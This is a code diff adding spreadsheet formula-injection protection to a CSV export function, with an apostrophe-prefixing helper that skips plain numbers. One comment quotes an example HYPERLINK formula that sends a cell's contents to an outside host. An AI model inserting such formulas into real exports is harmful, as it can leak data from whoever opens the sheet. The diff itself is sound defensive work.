@@ -3,9 +3,49 @@
  * Pure functions so they can be unit tested without a browser or server.
  */
 
+/**
+ * Characters that make a spreadsheet treat a cell as a formula rather than as
+ * text. Tab and carriage return are here because Excel skips leading
+ * whitespace before deciding, so "\t=1+1" is still a formula.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/** A plain number, in either decimal notation. Never a formula. */
+const NUMERIC = /^[+-]?\d+([.,]\d+)?$/;
+
+/**
+ * Neutralises a cell that a spreadsheet would otherwise run.
+ *
+ * Everything exported here is typed by someone else: customer names, delivery
+ * notes, product names that arrived through a supplier import. A name of
+ * `=HYPERLINK("http://elders/?x="&A1,"Klik")` is a working formula the moment a
+ * colleague opens the export in Excel, and quoting does not stop it — Excel
+ * drops the quotes and evaluates what is left.
+ *
+ * A leading apostrophe is the standard fix: spreadsheets read the rest of the
+ * cell as literal text and do not show the apostrophe itself.
+ */
+function neutralise(value: string): string {
+  if (!FORMULA_LEAD.test(value)) return value;
+  // A negative amount starts with "-" and is not a formula. Prefixing it would
+  // turn a revenue column into text and break every sum in the sheet, so plain
+  // numbers are left exactly as they are.
+  if (NUMERIC.test(value)) return value;
+  return `'${value}`;
+}
+
 export function toCsv(rows: (string | number | null | undefined)[][], separator = ";"): string {
   return rows
-    .map((row) => row.map((cell) => `"${String(cell ?? "").replace(/"/g, '""')}"`).join(separator))
+    .map((row) =>
+      row
+        .map((cell) => {
+          // Numbers are formatted by the caller and cannot carry a formula, but
+          // they arrive as strings here, so they go through the same path.
+          const text = neutralise(String(cell ?? ""));
+          return `"${text.replace(/"/g, '""')}"`;
+        })
+        .join(separator),
+    )
     .join("\r\n");
 }
 
